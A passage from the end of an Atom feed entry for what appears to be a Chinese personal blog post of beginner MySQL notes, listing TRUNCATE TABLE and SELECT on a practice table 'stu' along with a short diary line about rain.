src="https://i.loli.net/2021/11/06/EabTQjtSImKsDOR.png"></p><p>TRUNCATE TABLE stu; ——-清空数据库</p><p>SELECT * FROM stu; ————-查库</p><p>2021 11 06 一天的小雨</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MYSQL&quot;&gt;&lt;a href=&quot;#MYSQL&quot; class=&quot;headerlink&quot; title=&quot;MYSQL&quot;&gt;&lt;/a&gt;MYSQL&lt;/h1&gt;&lt;h4 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
